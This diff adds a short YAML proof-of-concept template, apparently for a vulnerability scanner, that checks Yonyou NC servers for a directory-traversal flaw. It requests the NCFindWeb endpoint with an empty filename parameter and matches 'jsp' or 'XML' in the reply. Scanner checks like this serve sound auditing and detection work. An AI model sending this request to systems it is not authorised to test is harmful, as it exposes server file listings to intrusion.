@@ -1,0 +1,10 @@
+name: poc-yaml-用友nc-Directory
+description: "可进行目录遍历"
+method: GET
+path:
+  - /NCFindWeb?service=IPreAlertConfigService&filename=
+expression:
+  status: 200
+  body_any:
+    - "jsp"
+    - "XML"
